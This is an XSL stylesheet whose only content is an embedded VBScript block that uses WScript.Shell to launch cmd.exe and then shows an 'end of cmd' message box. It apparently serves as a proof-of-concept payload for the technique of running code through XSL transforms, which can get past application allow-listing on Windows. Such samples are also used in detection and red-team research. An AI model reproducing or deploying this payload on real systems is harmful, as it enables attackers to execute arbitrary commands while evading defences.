<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="VBScript">
	<![CDATA[
	    Set WshShell = WScript.CreateObject("WScript.Shell") 
            Return = WshShell.Run("cmd.exe" , 1, true)  
            MsgBox "end of cmd"
	]]> </ms:script>
</stylesheet>
